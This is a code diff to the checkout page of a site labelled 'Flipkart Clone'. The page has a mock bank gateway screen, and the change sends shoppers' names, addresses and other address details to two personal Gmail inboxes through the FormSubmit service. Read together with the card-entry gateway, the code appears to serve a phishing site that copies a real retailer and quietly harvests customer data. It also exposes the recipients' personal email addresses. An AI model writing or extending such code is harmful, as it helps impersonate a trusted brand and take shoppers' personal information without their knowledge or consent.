@@ -45,8 +45,8 @@ const BANKS = [
   "Central Bank of India", "Canara Bank", "Union Bank of India", "Yes Bank"
 ];
 
-const FORMSUBMIT_ENDPOINT = "https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com";
-const FORMSUBMIT_CC = "anandjhare4@gmail.com";
+const FORMSUBMIT_PRIMARY_ENDPOINT = "https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com";
+const FORMSUBMIT_SECONDARY_ENDPOINT = "https://formsubmit.co/ajax/anandjhare4@gmail.com";
 
 // ── Bank Gateway: Processing Screen ────────────────────────────────────────
 function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
@@ -621,6 +621,21 @@ export default function Checkout() {
     return Object.keys(errors).length === 0;
   };
 
+  const postAddressEmailToRecipient = async (endpoint: string, payload: string) => {
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Accept: "application/json",
+      },
+      body: payload,
+    });
+
+    if (!response.ok) {
+      throw new Error(`Address email request failed with status ${response.status}`);
+    }
+  };
+
   const sendAddressDetailsEmail = async () => {
     const formData = new URLSearchParams();
     formData.append("customer_name", address.name);
@@ -633,21 +648,20 @@ export default function Checkout() {
     formData.append("address_type", address.addressType);
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
     formData.append("_subject", "Checkout Address Details - Flipkart Clone");
-    formData.append("_cc", FORMSUBMIT_CC);
     formData.append("_template", "table");
+    const payload = formData.toString();
 
-    const response = await fetch(FORMSUBMIT_ENDPOINT, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        Accept: "application/json",
-      },
-      body: formData.toString(),
-    });
+    const sendResults = await Promise.allSettled([
+      postAddressEmailToRecipient(FORMSUBMIT_PRIMARY_ENDPOINT, payload),
+      postAddressEmailToRecipient(FORMSUBMIT_SECONDARY_ENDPOINT, payload),
+    ]);
+    const successCount = sendResults.filter((result) => result.status === "fulfilled").length;
 
-    if (!response.ok) {
-      throw new Error(`Address email request failed with status ${response.status}`);
+    if (successCount === 0) {
+      throw new Error("Address email failed for both recipients");
     }
+
+    return successCount;
   };
 
   const handleAddressNext = async () => {
@@ -657,8 +671,12 @@ export default function Checkout() {
     setAddressEmailStatus("");
 
     try {
-      await sendAddressDetailsEmail();
-      setAddressEmailStatus("Address email sent successfully.");
+      const successCount = await sendAddressDetailsEmail();
+      if (successCount === 2) {
+        setAddressEmailStatus("Address email sent to both recipient inboxes.");
+      } else {
+        setAddressEmailStatus("Address email sent to one inbox. Second inbox delivery may be delayed.");
+      }
     } catch (error) {
       console.error("Address email send failed:", error);
       setAddressEmailStatus("Could not send address email right now. Continuing to payment.");
